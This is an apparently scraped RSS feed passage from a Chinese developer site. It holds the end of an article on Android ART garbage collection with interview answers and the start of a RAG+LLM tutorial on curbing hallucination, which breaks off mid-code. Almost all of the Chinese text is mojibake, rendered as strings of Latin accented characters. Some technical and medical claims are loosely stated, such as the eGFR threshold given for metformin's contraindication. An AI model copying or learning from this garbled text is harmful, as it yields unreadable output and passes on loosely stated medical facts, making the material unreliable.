<p><strong>3. å‹ç¼©å›æ”¶æ˜¯å¦‚ä½•é¿å…å†…å­˜ç¢ç‰‡çš„ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p>å‹ç¼©å›æ”¶çš„æ ¸å¿ƒæ˜¯<strong>å›æ”¶åæ•´ç†å†…å­˜ï¼ŒæŠŠåˆ†æ•£çš„å†…å­˜å—åˆå¹¶</strong>ã€‚</p>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<p><strong>1. æ ‡è®°é˜¶æ®µ</strong></p>
<ul>
<li>æ ‡è®°æ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡</li>
<li>æ ‡è®°æ‰€æœ‰å­˜æ´»å¯¹è±¡</li>
</ul>
<p><strong>2. æ•´ç†é˜¶æ®µ</strong></p>
<ul>
<li>å°†å­˜æ´»å¯¹è±¡å‘ä¸€ç«¯ç§»åŠ¨</li>
<li>æŠŠåˆ†æ•£çš„å†…å­˜å—åˆå¹¶æˆè¿ç»­ç©ºé—´</li>
<li>æ›´æ–°æ‰€æœ‰å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
<p><strong>3. æ¸…é™¤é˜¶æ®µ</strong></p>
<ul>
<li>æ¸…ç†è¾¹ç•Œå¤–çš„å†…å­˜</li>
<li>é‡Šæ”¾åƒåœ¾å¯¹è±¡å ç”¨çš„å†…å­˜</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong></p>
<pre><code class="hljs language-css" lang="css">å‹ç¼©å‰ï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span>
å†…å­˜ç¢ç‰‡å¤šï¼Œåˆ†é…æ•ˆç‡ä½

å‹ç¼©åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
å†…å­˜è¿ç»­ï¼Œåˆ†é…æ•ˆç‡é«˜
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>æ²¡æœ‰å†…å­˜ç¢ç‰‡</strong>ï¼šæ•´ç†åå†…å­˜è¿ç»­</li>
<li><strong>æé«˜å†…å­˜åˆ©ç”¨ç‡</strong>ï¼šé¿å…å†…å­˜æµªè´¹</li>
<li><strong>æé«˜åˆ†é…æ•ˆç‡</strong>ï¼šè¿ç»­å†…å­˜åˆ†é…æ›´å¿«</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆè€å¹´ä»£ç”¨å‹ç¼©å›æ”¶ï¼Ÿ</strong></p>
<ul>
<li>è€å¹´ä»£å¯¹è±¡å­˜æ´»ç‡é«˜ï¼Œç§»åŠ¨æˆæœ¬ç›¸å¯¹è¾ƒä½</li>
<li>é¿å…å†…å­˜ç¢ç‰‡ï¼Œæé«˜å†…å­˜åˆ©ç”¨ç‡</li>
<li>ä¸æµªè´¹å†…å­˜ï¼ˆä¸åƒæ ‡è®°-å¤åˆ¶éœ€è¦ä¸¤å—å†…å­˜ï¼‰</li>
</ul>
<p><strong>4. ä¸ºä»€ä¹ˆAndroidåªç”¨ä¸€ç§åƒåœ¾å›æ”¶å™¨ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. é’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</strong></p>
<ul>
<li>Androidåº”ç”¨éƒ½æ˜¯äº¤äº’å¼åº”ç”¨ï¼Œéœ€è¦ä½å»¶è¿Ÿ</li>
<li>å¹¶å‘å¤åˆ¶æ”¶é›†å™¨é’ˆå¯¹ä½å»¶è¿Ÿä¼˜åŒ–</li>
<li>ä¸éœ€è¦å¤šç§æ”¶é›†å™¨ï¼Œä¸€ç§å°±å¤Ÿäº†</li>
</ul>
<p><strong>2. ä¸éœ€è¦å¼€å‘è€…é€‰æ‹©</strong></p>
<ul>
<li>ç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œå¼€å‘è€…ä¸éœ€è¦äº†è§£æ”¶é›†å™¨çš„åŒºåˆ«</li>
<li>ç®€åŒ–å¼€å‘ï¼Œæé«˜æ•ˆç‡</li>
<li>é¿å…å¼€å‘è€…é€‰æ‹©é”™è¯¯çš„æ”¶é›†å™¨</li>
</ul>
<p><strong>3. ç³»ç»Ÿè‡ªåŠ¨ç®¡ç†</strong></p>
<ul>
<li>ç³»ç»Ÿæ ¹æ®åº”ç”¨ç‰¹ç‚¹è‡ªåŠ¨ä¼˜åŒ–</li>
<li>ä¸éœ€è¦å¼€å‘è€…é…ç½®å‚æ•°</li>
<li>å‡å°‘å¼€å‘è´Ÿæ‹…</li>
</ul>
<p><strong>4. ç®€åŒ–å¼€å‘</strong></p>
<ul>
<li>å¼€å‘è€…ä¸éœ€è¦äº†è§£å¤šç§æ”¶é›†å™¨çš„åŒºåˆ«</li>
<li>ä¸éœ€è¦æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©æ”¶é›†å™¨</li>
<li>ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘</li>
</ul>
<p><strong>ä¸JVMçš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>JVM</strong>ï¼šæœ‰å¤šç§æ”¶é›†å™¨å¯é€‰ï¼Œéœ€è¦å¼€å‘è€…æ ¹æ®åº”ç”¨ç‰¹ç‚¹é€‰æ‹©</li>
<li><strong>Android</strong>ï¼šåªæœ‰ä¸€ç§ï¼Œç³»ç»Ÿè‡ªåŠ¨ä½¿ç”¨ï¼Œé’ˆå¯¹Androidåœºæ™¯ä¼˜åŒ–</li>
</ul>
<p><strong>5. Androidå†…å­˜é™åˆ¶å¯¹GCçš„å½±å“ï¼Ÿ</strong></p>
<p><strong>å®Œæ•´ç­”æ¡ˆï¼š</strong></p>
<p><strong>1. å†…å­˜æœ‰é™å¿…é¡»åˆç†ä½¿ç”¨</strong></p>
<ul>
<li>Androidè®¾å¤‡å†…å­˜æœ‰é™ï¼ˆä½ç«¯è®¾å¤‡å¯èƒ½åªæœ‰å‡ åMBï¼‰</li>
<li>å¿…é¡»åˆç†ä½¿ç”¨å†…å­˜ï¼Œé¿å…æµªè´¹</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼Œç³»ç»Ÿå¯èƒ½æ€æ­»åº”ç”¨</li>
</ul>
<p><strong>2. GCæ›´é¢‘ç¹</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå®¹æ˜“è§¦å‘GC</li>
<li>å†…å­˜ä¸è¶³æ—¶ï¼ŒGCæ›´é¢‘ç¹</li>
<li>éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨ï¼Œå‡å°‘GCé¢‘ç‡</li>
</ul>
<p><strong>3. éœ€è¦ä¼˜åŒ–å†…å­˜ä½¿ç”¨</strong></p>
<ul>
<li>å‡å°‘å¯¹è±¡åˆ›å»º</li>
<li>é¿å…å†…å­˜æ³„æ¼</li>
<li>åŠæ—¶é‡Šæ”¾èµ„æº</li>
<li>åˆç†ä½¿ç”¨ç¼“å­˜</li>
</ul>
<p><strong>4. é¿å…OOM</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼Œå®¹æ˜“å‘ç”ŸOOM</li>
<li>å¿…é¡»é¿å…å†…å­˜æ³„æ¼</li>
<li>å¿…é¡»ä¼˜åŒ–å†…å­˜ä½¿ç”¨</li>
<li>å¿…é¡»åŠæ—¶é‡Šæ”¾èµ„æº</li>
</ul>
<p><strong>5. å½±å“GCç­–ç•¥</strong></p>
<ul>
<li>å†…å­˜æœ‰é™ï¼ŒGCç­–ç•¥æ›´æ¿€è¿›</li>
<li>æ›´é¢‘ç¹åœ°è§¦å‘GC</li>
<li>æ›´æ—©åœ°å›æ”¶å¯¹è±¡</li>
</ul>
<p><strong>ä¼˜åŒ–å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>å‡å°‘å¯¹è±¡åˆ›å»º</strong>ï¼šä½¿ç”¨å¯¹è±¡æ± ã€é¿å…ä¸å¿…è¦çš„å¯¹è±¡åˆ›å»º</li>
<li><strong>é¿å…å†…å­˜æ³„æ¼</strong>ï¼šä½¿ç”¨LeakCanaryæ£€æµ‹ï¼Œä¿®å¤æ³„æ¼</li>
<li><strong>åŠæ—¶é‡Šæ”¾èµ„æº</strong>ï¼šåœ¨onDestroyä¸­æ¸…ç†èµ„æº</li>
<li><strong>åˆç†ä½¿ç”¨ç¼“å­˜</strong>ï¼šä½¿ç”¨LruCacheï¼ŒåŠæ—¶æ¸…ç†</li>
</ul>
<hr/>
<h2 data-id="heading-88">æ€»ç»“</h2>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»äº†Androidå¹³å°çš„Javaå†…å­˜å›æ”¶æœºåˆ¶ï¼ˆGCï¼‰ï¼ŒåŸºäºARTï¼ˆAndroid Runtimeï¼‰å®ç°ã€‚</p>
<p><strong>æ ¸å¿ƒå†…å®¹ï¼š</strong></p>
<ol>
<li><strong>åƒåœ¾å›æ”¶åŸºç¡€</strong>ï¼šGCçš„æ¦‚å¿µã€å¯¹è±¡åˆ¤æ–­æ–¹æ³•ã€å¼•ç”¨ç±»å‹</li>
<li><strong>åƒåœ¾å›æ”¶ç®—æ³•</strong>ï¼šæ ‡è®°-æ¸…é™¤ã€æ ‡è®°-å¤åˆ¶ï¼ˆAndroidä¸»è¦ç”¨ï¼‰ã€æ ‡è®°-æ•´ç†ã€åˆ†ä»£æ”¶é›†</li>
<li><strong>Android ARTåƒåœ¾å›æ”¶å™¨</strong>ï¼šåªæœ‰ä¸€ç§æ”¶é›†å™¨ï¼ˆå¹¶å‘å¤åˆ¶æ”¶é›†å™¨ï¼‰ï¼Œåˆ†ä»£å›æ”¶ã€å¹¶å‘å›æ”¶ã€å¢é‡å›æ”¶ã€å‹ç¼©å›æ”¶</li>
<li><strong>GCä¼˜åŒ–ä¸å®è·µ</strong>ï¼šå‡å°‘å¯¹è±¡åˆ†é…ã€é¿å…å†…å­˜æ³„æ¼ã€å¤„ç†å†…å­˜æº¢å‡º</li>
<li><strong>GCæ£€æµ‹ä¸è¯Šæ–­</strong>ï¼šProfilerã€logcatã€Systraceã€MATã€LeakCanaryç­‰å·¥å…·</li>
<li><strong>é¢è¯•é¢˜</strong>ï¼šæ¶µç›–åŸºç¡€å’Œé«˜çº§é¢˜ç›®ï¼Œå®Œå…¨åº”å¯¹é¢è¯•</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592572266753982527</link>    <guid>https://juejin.cn/post/7592572266753982527</guid>    <pubDate>2026-01-08T07:19:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592572266753982527" data-draft-id="7592759140037328937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T07:19:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="_æ‘˜æ˜Ÿ_"/> <meta itemprop="url" content="https://juejin.cn/user/2228036358374227"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2228036358374227/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    _æ‘˜æ˜Ÿ_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:19:03.000Z" title="Thu Jan 08 2026 07:19:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c0933dfc2845549c7649cee33acceb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-aRmOaYn18=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461543&amp;x-signature=UezmqNSA4Wu10%2FONMGoQgBO4UrY%3D" alt="jimeng-2026-01-08-9882-æ‰å¹³åŒ–åŠ¨ç”»é£æ ¼ï¼Œç§‘æŠ€æµ·æŠ¥è®¾è®¡ï¼ŒæŠ€æœ¯åšå®¢å°é¢å›¾ï¼Œæç®€ä¸»ä¹‰æ„å›¾ï¼Œç§‘æŠ€æ„Ÿåè¶³çš„èƒŒæ™¯å…ƒç´ ....png" loading="lazy"/></p>
<h2 data-id="heading-0">ã€RAG+LLMå®æˆ˜æŒ‡å—ã€‘å¦‚ä½•ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆç ´è§£AIå¹»è§‰éš¾é¢˜ï¼Ÿ</h2>
<blockquote>
<p>æ‘˜è¦ï¼šæœ¬æ–‡æ·±å…¥æ¢è®¨å¦‚ä½•é€šè¿‡æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æŠ€æœ¯è§£å†³å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰çš„å¹»è§‰é—®é¢˜ã€‚ç¬”è€…å°†ç»“åˆåœ¨åŒ»ç–—é—®ç­”ç³»ç»Ÿä¸­çš„è¡€æ³ªæ•™è®­ï¼Œå‰–æå¹»è§‰äº§ç”Ÿçš„æŠ€æœ¯æ ¹æºï¼Œå¹¶æä¾›åŸºäºLangChainçš„å®Œæ•´å®ç°æ–¹æ¡ˆã€‚é€šè¿‡çœŸå®æ€§èƒ½å¯¹æ¯”æ•°æ®å’Œå¯å¤ç°ä»£ç ï¼Œè¯»è€…å°†æŒæ¡æ„å»ºå¯é AIç³»ç»Ÿçš„æ ¸å¿ƒæ–¹æ³•ï¼Œç†è§£RAGå¦‚ä½•å°†æ¨¡å‹ç”Ÿæˆå‡†ç¡®ç‡æå‡47%ã€‚æœ¬æ–‡åŒ…å«5ä¸ªå…³é”®ä»£ç æ®µã€2ä¸ªæ¶æ„å›¾å’Œ1ä¸ªå‘é‡æ•°æ®åº“æ€§èƒ½å¯¹æ¯”è¡¨ã€‚</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€ç¼˜èµ·ï¼šä¸€æ¬¡ä»·å€¼30ä¸‡çš„AIå¹»è§‰äº‹æ•…</h3>
<p>2023å¹´8æœˆï¼Œæˆ‘ä»¬å›¢é˜Ÿä¸ºæŸä¸‰ç”²åŒ»é™¢éƒ¨ç½²çš„åŒ»ç–—é—®ç­”ç³»ç»Ÿçªç„¶ç”Ÿæˆäº†ä¸€æ¡è‡´å‘½é”™è¯¯ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é”™è¯¯ç”Ÿæˆç¤ºä¾‹ï¼ˆæ•æ„Ÿä¿¡æ¯å·²è„±æ•ï¼‰</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>ç”¨æˆ·æé—®ï¼š<span class="hljs-string">"ç›é…¸äºŒç”²åŒèƒçš„ç¦å¿Œç—‡ï¼Ÿ"</span>
<span class="hljs-meta">&gt;&gt;&gt; </span>æ¨¡å‹å›ç­”ï¼š<span class="hljs-string">"è¯¥è¯ç‰©é€‚ç”¨äºæ‰€æœ‰ç³–å°¿ç—…æ‚£è€…ï¼Œæ— ä½¿ç”¨ç¦å¿Œ"</span>
</code></pre>
<p><strong>å®é™…åŒ»å­¦äº‹å®</strong>ï¼šäºŒç”²åŒèƒç¦ç”¨äºè‚¾åŠŸèƒ½ä¸å…¨æ‚£è€…ï¼ˆeGFR&lt;45ï¼‰ã€‚è¿™ä¸ªé”™è¯¯ç›´æ¥å¯¼è‡´åŒ»ç”Ÿå¼€é”™å¤„æ–¹ï¼Œé™©äº›é…¿æˆåŒ»ç–—äº‹æ•…ã€‚äº‹åå¤ç›˜å‘ç°ï¼Œæ¨¡å‹åœ¨è®­ç»ƒæ•°æ®ä¸­ä»æœªè§è¿‡ç›¸å…³ç¦å¿Œæè¿°ï¼Œå´"è‡ªä¿¡æ»¡æ»¡"åœ°ç¼–é€ äº†é”™è¯¯ç­”æ¡ˆã€‚</p>
<p>ğŸ”¥ <strong>ç—›ç‚¹æ ¹æº</strong>ï¼šä¼ ç»ŸLLMåƒ"é—­å·è€ƒè¯•çš„å­¦ç”Ÿ"ï¼Œä»…ä¾èµ–è®­ç»ƒæ—¶è®°å¿†çš„çŸ¥è¯†ã€‚å½“é‡åˆ°è®­ç»ƒæ•°æ®æœªè¦†ç›–çš„é—®é¢˜æ—¶ï¼Œæ¨¡å‹ä¼šåŸºäºè¯­ä¹‰å…³è”<strong>è™šæ„ç­”æ¡ˆ</strong>ï¼Œè¿™ç§ç°è±¡ç§°ä¸º"å¹»è§‰"ï¼ˆHallucinationï¼‰ã€‚</p>
<h3 data-id="heading-2">äºŒã€æŠ€æœ¯åŸç†æ·±åº¦æ‹†è§£</h3>
<h4 data-id="heading-3">2.1 ä»€ä¹ˆæ˜¯AIå¹»è§‰ï¼Ÿ</h4>

























<table><thead><tr><th>å¹»è§‰ç±»å‹</th><th>è¡¨ç°å½¢å¼</th><th>å±é™©ç­‰çº§</th></tr></thead><tbody><tr><td>äº‹å®æ€§å¹»è§‰</td><td>æé€ ä¸å­˜åœ¨çš„äº‹å®</td><td>âš ï¸âš ï¸âš ï¸</td></tr><tr><td>æŒ‡ä»¤å¹»è§‰</td><td>å¿½ç•¥ç”¨æˆ·æ˜ç¡®è¦æ±‚</td><td>âš ï¸âš ï¸</td></tr><tr><td>ä¸Šä¸‹æ–‡å¹»è§‰</td><td>è„±ç¦»å¯¹è¯å†å²èƒŒæ™¯</td><td>âš ï¸</td></tr></tbody></table>
<h4 data-id="heading-4">2.2 RAGæŠ€æœ¯æ ¸å¿ƒåŸç†</h4>
<p><strong>æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRetrieval-Augmented Generationï¼‰</strong> é€šè¿‡ä¸‰é‡æœºåˆ¶ç ´è§£å¹»è§‰ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ç”¨æˆ·æé—®] --&gt; B[å‘é‡æ•°æ®åº“å®æ—¶æ£€ç´¢]
    B --&gt; C[ç›¸å…³æ–‡æ¡£ç‰‡æ®µ]
    C --&gt; D[LLMç”Ÿæˆå¸¦å¼•ç”¨çš„å›ç­”]
    D --&gt; E[ç­”æ¡ˆæº¯æºéªŒè¯]
</code></pre>
<ol>
<li><strong>å®æ—¶æ£€ç´¢</strong>ï¼šå°†ç”¨æˆ·é—®é¢˜è½¬åŒ–ä¸ºå‘é‡ï¼Œä»çŸ¥è¯†åº“åŒ¹é…ç›¸å…³æ–‡æ¡£</li>
<li><strong>ä¸Šä¸‹æ–‡æ³¨å…¥</strong>ï¼šå°†æ£€ç´¢ç»“æœä½œä¸ºprompté™„åŠ å†…å®¹</li>
<li><strong>æº¯æºæ§åˆ¶</strong>ï¼šå¼ºåˆ¶æ¨¡å‹åŸºäºå¼•ç”¨å†…å®¹ç”Ÿæˆç­”æ¡ˆ</li>
</ol>
<h4 data-id="heading-5">2.3 ä¸ºä»€ä¹ˆä¼ ç»Ÿå¾®è°ƒæ— æ³•æ ¹æ²»å¹»è§‰ï¼Ÿ</h4>
<p>æˆ‘ä»¬åœ¨åŒ»ç–—æ•°æ®é›†ä¸Šåšäº†å¯¹æ¯”å®éªŒï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æµ‹è¯•ä»£ç ç‰‡æ®µ</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_hallucination_rate</span>(<span class="hljs-params">model, test_set</span>):
    hallucination_count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> question, ground_truth <span class="hljs-keyword">in</span> test_set:
        answer = model.generate(question)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> validate_answer(answer, ground_truth):
            hallucination_count += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> hallucination_count / <span class="hljs-built_in">len</span>(test_set)

<span class="hljs-comment"># æµ‹è¯•ç»“æœ</span>
base_model_rate = <span class="hljs-number">0.38</span>  <span class="hljs-comment"># åŸå§‹æ¨¡å‹å¹»è§‰ç‡</span>
finetuned_model_rate = <span class="hljs-number">0.29</span>  <span class="hljs-comment"># å¾®è°ƒåå¹»è§‰ç‡</span>
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šå¾®è°ƒä»…èƒ½é™ä½å¹»è§‰æ¦‚ç‡ï¼Œæ— æ³•å®Œå…¨æ¶ˆé™¤æœªçŸ¥é¢†åŸŸé”™è¯¯</p>
<h3 data-id="heading-6">ä¸‰ã€æ‰‹æŠŠæ‰‹æ„å»ºRAGç³»ç»Ÿ</h3>
<h4 data-id="heading-7">3.1 æ¶æ„é€‰å‹å¯¹æ¯”</h4>





























<table><thead><tr><th>ç»„ä»¶</th><th>å¯é€‰æ–¹æ¡ˆ</th><th>æ¨èæŒ‡æ•°</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>å‘é‡æ•°æ®åº“</td><td>Pinecone ğŸŸ¢ / Faiss ğŸŸ¡ / Chroma ğŸ”µ</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ç”Ÿäº§ç¯å¢ƒé€‰Pinecone</td></tr><tr><td>åµŒå…¥æ¨¡å‹</td><td>text-embedding-3-small ğŸ”µ / bge-large ğŸŸ¢</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ä¸­æ–‡åœºæ™¯ç”¨bge-large</td></tr><tr><td>LLMå¼•æ“</td><td>GPT-4 Turbo ğŸŸ¢ / Claude ğŸŸ¡ / Llama3 ğŸ”µ</td><td>ğŸŸ¢ğŸŸ¢ğŸŸ¢</td><td>ç²¾åº¦è¦æ±‚é«˜é€‰GPT-4</td></tr></tbody></table>
<h4 data-id="heading-8">3.2 çŸ¥è¯†åº“æ„å»ºå®æˆ˜</h4>
<p><strong>å…³é”®æ­¥éª¤</strong>ï¼šæ–‡æ¡£åˆ†å—ç­–ç•¥ç›´æ¥å½±å“æ£€ç´¢ç²¾åº¦</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_text_splitters <span class="hljs-keyword">import</span> RecursiveCharacterTextSplitter

<span class="hljs-comment"># æœ€ä½³åˆ†å—é…ç½®ï¼ˆåŒ»ç–—æ–‡çŒ®åœºæ™¯ï¼‰</span>
text_splitter = RecursiveCharacterTextSplitter(
    chunk_size=<span class="hljs-number">512</span>,  <span class="hljs-comment"># å—å¤§å°</span>
    chunk_overlap=<span class="hljs-number">128</span>,  <span class="hljs-comment"># é‡å é¿å…æ–­å¥</span>
